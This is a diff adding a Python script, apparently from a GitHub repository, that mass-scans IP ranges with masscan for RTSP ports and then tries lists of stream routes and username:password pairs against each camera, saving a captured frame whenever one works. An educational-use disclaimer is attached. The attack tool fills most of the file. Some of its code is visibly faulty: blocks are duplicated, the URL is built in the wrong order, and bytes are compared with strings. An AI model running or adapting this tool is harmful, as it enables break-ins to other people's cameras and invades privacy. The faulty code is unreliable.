@@ -1,0 +1,113 @@
+'''
+This script uses masscan to find open RTSP streams on the specified ports, and then tries each RTSP route and each set of credentials for each IP address, using ffmpeg to capture the first frame of the stream in a separate thread for each IP address. The threads are started concurrently using a thread pool, which limits the number of concurrent threads to the number specified in the max_threads variable. ffmpeg is set to timeout after 30 seconds if it is unable to access the stream. If ffmpeg is able to capture a frame from the stream, the image is saved to a folder with the current date and time as the name. The script accepts the following command-line arguments:
+
+ip_addresses_file: Text file containing a list of IP addresses (one per line) (optional)
+rtsp_routes_file: Text file containing a list of RTSP routes (one per line)
+credentials_file: Text file containing a list of usernames and passwords (one per line, separated by a colon)
+ports: Comma-separated list of ports to scan for RTSP streams
+timeout: Timeout for the masscan scan (in milliseconds)
+range: Range of IP addresses to scan (e.g. 192.168.1.1-192.168.1.255)
+
+The information provided in this GitHub repository is for informational and educational purposes only. The authors of this repository do not endorse or recommend the use of the scripts or code contained in this repository for any illegal or unauthorized purposes. The authors of this repository shall not be held liable for any damages or consequences resulting from the use of the scripts or code contained in this repository. The use of the scripts or code contained in this repository is at the user's own risk, and the user is solely responsible for compliance with all applicable laws and regulations, including any requirements for obtaining written permission before conducting security testing on any systems or networks. The authors of this repository do not provide any warranties or guarantees, express or implied, regarding the scripts or code contained in this repository or their performance. By using the scripts or code contained in this repository, the user confirms that they have read and understood this disclaimer, and that they will use the scripts or code in a responsible and legal manner.
+
+Please note that the code in this repository is untested and may contain errors or bugs. Use the code at your own risk and thoroughly test it before using it in any production environments. The authors of this repository do not provide any warranties or guarantees regarding the performance or reliability of the code.
+'''
+
+import os
+import subprocess
+import tempfile
+import argparse
+import datetime
+import concurrent.futures
+
+def capture_image(ip_address, rtsp_route, username, password, image_folder):
+    # Construct the RTSP URL
+    rtsp_url = f"{rtsp_route}/{ip_address}"
+
+    # Use ffmpeg to capture the first frame of the stream to a temporary file, including the username and password if provided
+    ffmpeg_args = ["ffmpeg", "-y", "-timeout", "30", "-i", rtsp_url, "-vframes", "1", "-threads", "4"]
+    if username:
+        ffmpeg_args += ["-user", username]
+    if password:
+        ffmpeg_args += ["-passwd", password]
+    with tempfile.NamedTemporaryFile() as image_file:
+        ffmpeg_args += [image_file.name]
+        ffmpeg_output = subprocess.run(ffmpeg_args, capture_output=True).stdout
+
+        # Check if the image was successfully captured
+        if "Invalid data found" not in ffmpeg_output:
+            # Save the image to the image folder
+            image_path = os.path.join(image_folder, f"{ip_address}.jpg")
+            with open(image_path, "wb") as f:
+                f.write(image_file.read())
+
+# Parse the command-line arguments
+parser = argparse.ArgumentParser()
+parser.add_argument("ip_addresses_file", nargs="?", help="Text file containing a list of IP addresses (one per line)")
+parser.add_argument("rtsp_routes_file", help="Text file containing a list of RTSP routes (one per line)")
+parser.add_argument("credentials_file", help="Text file containing a list of usernames and passwords (one per line, separated by a colon)")
+parser.add_argument("-p", "--ports", required=True, help="Comma-separated list of ports to scan for RTSP streams")
+parser.add_argument("-t", "--timeout", type=int, default=1000, help="Timeout for the masscan scan (in milliseconds)")
+parser.add_argument("--range", help="Range of IP addresses to scan (e.g. 192.168.1.1-192.168.1.255)")
+args = parser.parse_args()
+
+# Read the list of RTSP routes from the specified text file
+with open(args.rtsp_routes_file) as f:
+    rtsp_routes = f.read().splitlines()
+
+# Read the list of usernames and passwords from the specified text file
+with open(args.credentials_file) as f:
+    credentials = [(line.split(":")[0], line.split(":")[1]) for line in f.read().splitlines()]
+
+# Read the list of RTSP routes from the specified text file
+with open(args.rtsp_routes_file) as f:
+    rtsp_routes = f.read().splitlines()
+
+# Read the list of usernames and passwords from the specified text file
+with open(args.credentials_file) as f:
+    credentials = [(line.split(":")[0], line.split(":")[1]) for line in f.read().splitlines()]
+
+# Create a folder to store the captured images, using the current date and time as the folder name
+now = datetime.datetime.now()
+image_folder = os.path.join("images", now.strftime("%Y-%m-%d_%H-%M-%S"))
+os.makedirs(image_folder, exist_ok=True)
+
+# If an IP addresses file was specified, read the list of IP addresses from the file
+if args.ip_addresses_file:
+    with open(args.ip_addresses_file) as f:
+        ip_addresses = f.read().splitlines()
+
+# Otherwise, use masscan to scan for open RTSP streams on the specified ports
+else:
+    # Construct the masscan command-line arguments
+    masscan_args = ["masscan", "-p", args.ports, "--max-rate", "10000", "--wait", "5", "--open-only"]
+    if args.range:
+        masscan_args += ["--range", args.range]
+    masscan_args += ["--exclude", "255.255.255.255"]
+
+    # Run masscan to find the open RTSP streams
+    masscan_output = subprocess.run(masscan_args, capture_output=True).stdout
+
+    # Extract the IP addresses of the open RTSP streams from the masscan output
+    ip_addresses = []
+    for line in masscan_output.splitlines():
+        if "open" in line:
+            ip_addresses.append(line.split()[3])
+
+# Set the number of threads in the thread pool
+max_threads = 4
+
+# Create a thread pool
+with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
+    # Go through each IP address, and try each RTSP route and each set of credentials until a stream is found
+    threads = []
+    for ip_address in ip_addresses:
+        # Try each RTSP route and each set of credentials until a stream is found
+        for rtsp_route in rtsp_routes:
+            for username, password in credentials:
+                # Start a new thread to capture the image using the thread pool
+                future = executor.submit(capture_image, ip_address, rtsp_route, username, password, image_folder)
+                threads.append(future)
+
+# Wait for all threads to complete
+concurrent.futures.wait(threads)
